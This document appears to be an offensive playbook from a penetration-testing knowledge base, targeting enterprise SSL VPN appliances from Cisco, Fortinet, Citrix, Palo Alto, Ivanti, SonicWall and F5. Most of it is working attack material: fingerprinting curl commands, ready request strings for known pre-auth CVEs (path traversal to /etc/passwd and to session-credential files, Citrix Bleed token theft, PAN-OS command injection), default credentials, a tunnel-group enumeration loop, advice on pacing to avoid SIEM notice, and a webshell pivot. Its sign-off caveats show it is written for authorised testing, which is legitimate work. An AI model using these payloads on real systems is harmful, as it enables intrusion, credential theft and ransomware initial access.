# Moraa — Enterprise SSL VPN / remote-access appliance attack matrix

> Trigger: `+CSCOE+` paths, `vpn.*`/`connect.*`/`webvpn.*`/`remote.*` subdomains, cookies
> `webvpn=`(Cisco)/`SVPNCOOKIE=`(Fortinet)/`NSC_AAA=`(Citrix)/`DSAuthSession=`(Pulse/Ivanti)/
> `BIGipServer*`(F5). These appliances are the most common initial-access point in 2024-2026
> ransomware TTPs — patch lag on perimeter hardware runs years, not months.

## Vendor fingerprint
```bash
curl -skI 'https://T/+CSCOE+/logon.html'                    # Cisco ASA/AnyConnect
curl -skI 'https://T/remote/login'                           # Fortinet FortiGate
curl -skI 'https://T/'                                        # Citrix (NSC_AAA cookie)
curl -skI 'https://T/global-protect/login.esp'                # Palo Alto GlobalProtect
curl -skI 'https://T/dana-na/auth/url_default/welcome.cgi'    # Pulse Secure / Ivanti
curl -skI 'https://T/my.policy'                                # F5 Big-IP APM
```

## CVE matrix — pre-auth / auth-bypass, detection-only until sign-off
| Vendor | CVE | Vector | Test |
|---|---|---|---|
| Cisco ASA | CVE-2020-3452 | path traversal file read | `GET /+CSCOE+/files/file_name.html?Filename=Microsoft.Manifest+/+CSCOT+/lua/test.lua` |
| Cisco ASA | CVE-2018-0296 | path traversal | `GET /+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua` |
| Fortinet | CVE-2018-13379 | sslvpn_websession file read (plaintext sessions/creds) | `GET /remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession` |
| Fortinet | CVE-2023-27997 (XORtigate), CVE-2024-21762 | heap overflow, OOB write → pre-auth RCE | nuclei `CVE-2024-21762` |
| Citrix | CVE-2019-19781 (Shitrix) | path traversal → RCE | `GET /vpn/../vpns/cfg/smb.conf` |
| Citrix | CVE-2023-4966 (Citrix Bleed) | memory disclosure → session token theft | oversized `Host:` header (24812 'A') to `/oauth/idp/.well-known/openid-configuration`, check response >10KB |
| Palo Alto | CVE-2024-3400 | cmd injection via crafted Cookie | `POST /ssl-vpn/login.esp -H 'Cookie: SESSID=../../../var/log/pan/test_$(id)_test.txt'` |
| Pulse/Ivanti | CVE-2019-11510 | arbitrary file read | `GET /dana-na/../dana/html5acc/guacamole/../../../../../../../etc/passwd?/dana/html5acc/guacamole/` |
| Pulse/Ivanti | CVE-2023-46805 + CVE-2024-21887 | auth bypass + cmd injection chain | complex multi-step; nuclei template |
| SonicWall | CVE-2021-20016 | pre-auth SQLi (SMA 100) | nuclei template |

```bash
nuclei -u https://T/ -tags vpn,cisco-asa,fortinet,citrix,palo-alto,pulse-secure,sonicwall,f5 -severity high,critical -rl 5
```

## SAML SP metadata (check regardless of patch level — its own attack surface)
```bash
curl -sk 'https://T/+CSCOE+/saml/sp/metadata'      # Cisco
curl -sk 'https://T/remote/saml/metadata'           # Fortinet
```
`AuthnRequestsSigned="false"` → XSW candidate (`auth-oauth.md` § SAML SSO attacks). `WantAssertionsSigned="false"`
→ assertion replay. If AAA backend is Entra/Okta, pivot spray strategy to `m365-entra-attack.md`/
`okta-attack.md`.

## Default creds — test ≤2 attempts, most prod targets have changed these
`admin`/`cisco` (ASA) · `admin`/empty (Fortinet factory) · `nsroot`/`nsroot` (Citrix factory) ·
`admin`/`admin` (Palo Alto factory) · `admin`/`password` (Pulse factory) · `root`/`default` (F5).

## Cisco tunnel-group enumeration (timing-based)
```bash
for group in DefaultRAGroup DefaultWEBVPNGroup SSLVPN Employees Contractors Vendors Partners; do
  ms=$(curl -sk --max-time 10 -o /dev/null -w "%{time_total}" -X POST "https://T/+webvpn+/index.html" \
    -d "username=test&password=test&group_list=$group&tgroup=&Login=Login")
  echo "$group: ${ms}s"; done
```

## AAA backend identification (from post-fail error response)
`a0=2/3/4/12/115` = Cisco local codes (unknown-user/wrong-pw/restricted/locked/generic) ·
`AADSTS...` in body = Entra-backed SAML · `Authentication failed via RADIUS` = RADIUS ·
generic "Invalid username or password" = LDAP/local DB.

## Operational discipline
Detection-only probes first (HEAD + version banner), escalate to CVE PoCs only with explicit
sign-off — bricking a VPN concentrator is catastrophic for the client. Banner-stripped (no version
disclosed) is good defense — record as a positive finding, don't treat as "nothing here." These
appliances log to SIEM heavily; jittered, patient pace.

## Bridge
`vmware-vcenter-attack.md` (VPN webshell → cred extraction from appliance config → reuse against
internal vCenter, if scope permits going internal), `auth-oauth.md` § SAML, `m365-entra-attack.md`/
`okta-attack.md` (when AAA backend is a cloud IdP).
